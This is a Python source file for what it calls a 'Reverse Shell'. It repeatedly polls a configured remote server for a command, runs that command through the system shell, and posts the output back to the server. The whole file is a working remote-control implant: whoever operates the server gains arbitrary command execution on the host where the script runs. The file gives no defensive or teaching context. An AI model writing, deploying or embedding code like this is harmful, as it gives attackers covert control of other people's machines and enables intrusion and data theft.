from enum import StrEnum

import time
import requests
import subprocess

import config


def log(text: str):
    if config.LOG_EXECUTED_CMD:
        print(text)
        with open("log.txt", "a+") as f:
            f.write(text)


class API(StrEnum):
    cmd = f"{config.SERVER_HOST}/shell/cmd"
    output = f"{config.SERVER_HOST}/shell/output"


def run_cmd():
    try:
        shell_cmd = requests.get(API.cmd)
        command = shell_cmd.json()["cmd"]
        if command:
            log(f"\nReceived command: {command}")
        else:
            return

        cmd_output = ""
        try:
            result = subprocess.run(command, shell=True, check=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            cmd_output = str(result.stdout)
        except Exception as e:
            cmd_output = "Error while executing received command!"
        log(cmd_output)

        requests.post(API.output, json=cmd_output)
        requests.delete(API.cmd)

    except Exception as e:
        print("Error!")


def main():
    print("Reverse Shell was started!")
    while True:
        run_cmd()
        timeout = config.TIMEOUT
        print(f"Sleeping for {timeout} seconds")
        time.sleep(timeout)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Stopped by client")
